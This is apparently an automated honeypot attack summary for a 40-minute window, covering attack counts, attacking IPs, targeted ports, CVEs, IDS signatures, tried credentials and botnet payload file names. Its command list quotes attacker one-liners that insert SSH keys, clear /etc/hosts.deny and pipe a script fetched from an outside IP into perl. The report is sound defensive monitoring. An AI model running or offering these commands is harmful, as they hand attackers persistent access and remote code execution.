**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-26T16:01:36Z
**Timeframe:** 2025-10-26T15:20:01Z to 2025-10-26T16:00:01Z
**Files Used:**
- agg_log_20251026T152001Z.json
- agg_log_20251026T154002Z.json
- agg_log_20251026T160001Z.json

**Executive Summary**

This report summarizes 25,136 attacks recorded by the honeypot network. The majority of attacks were SSH brute-force attempts, with a significant number of scans on VoIP and Windows SMB services. The IP address `172.188.91.73` was the most active attacker. A number of known CVEs were targeted. Attackers attempted to download and execute malicious scripts, as well as add their own SSH keys for persistent access.

**Detailed Analysis**

**Attacks by Honeypot**
- Cowrie: 15,679
- Honeytrap: 2,312
- Sentrypeer: 1,989
- Ciscoasa: 1,733
- Suricata: 1,700
- Dionaea: 879
- Heralding: 559
- Mailoney: 111
- Adbhoney: 63
- Tanner: 36
- H0neytr4p: 21
- Miniprint: 17
- Redishoneypot: 17
- ElasticPot: 4
- Honeyaml: 3
- ssh-rsa: 2

**Top Attacking IPs**
- 172.188.91.73: 13,300
- 144.172.108.231: 962
- 41.139.164.134: 747
- 185.243.5.121: 557
- 196.251.85.178: 562
- 207.180.229.239: 272
- 185.243.5.158: 342
- 103.52.115.223: 257
- 107.170.36.5: 252
- 211.219.22.213: 277

**Top Targeted Ports/Protocols**
- 22/TCP (SSH): 3,046
- 5060/UDP (SIP): 1,989
- 445/TCP (SMB): 755
- VNC/5900: 559
- 8333/TCP: 164
- 25/TCP (SMTP): 111
- 5903/TCP (VNC): 132
- 5901/TCP (VNC): 116
- 25565/TCP (Minecraft): 69
- 27017/TCP (MongoDB): 33

**Most Common CVEs**
- CVE-2002-0013, CVE-2002-0012, CVE-1999-0517
- CVE-2003-0825
- CVE-2016-20016
- CVE-2021-35394
- CVE-2019-11500

**Commands Attempted by Attackers**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `uname -a ; wget -qO - http://137.184.112.170/perl|perl`

**Signatures Triggered**
- ET INFO VNC Authentication Failure: 438
- ET DROP Dshield Block Listed Source group 1: 230
- ET SCAN NMAP -sS window 1024: 174
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 159
- ET HUNTING RDP Authentication Bypass Attempt: 58
- ET INFO Reserved Internal IP Traffic: 61
- ET SCAN Potential SSH Scan: 45
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28: 17
- ET CINS Active Threat Intelligence Poor Reputation IP group 13: 10
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32: 18

**Users / Login Attempts**
- root/Gorilla2562
- root/Gpak501.
- 345gs5662d34/345gs5662d34
- oracle/Bscs@2024
- systemd/Voidsetdownload.so
- /terminal
- root/Gr0wth14!
- root/Grain660

**Files Uploaded/Downloaded**
- wget.sh
- Mozi.a+jaws
- w.sh
- c.sh
- morte.mips
- arm.uhavenobotsxd
- boatnet.mpsl

**HTTP User-Agents**
- No HTTP User-Agents were logged in this period.

**SSH Clients and Servers**
- No SSH clients or servers were logged in this period.

**Top Attacker AS Organizations**
- No attacker AS organizations were logged in this period.

**Key Observations and Anomalies**

- A significant number of commands were aimed at downloading and executing shell scripts from various IPs.
- Several attackers attempted to add their own SSH public key to the `authorized_keys` file for persistent access.
- There were multiple attempts to download and execute binaries for different architectures (ARM, MIPS, x86), indicating automated and widespread infection attempts.
- The command `cd /data/local/tmp/; busybox wget ...` was frequently observed, suggesting a focus on embedded and IoT devices.

This concludes the Honeypot Attack Summary Report.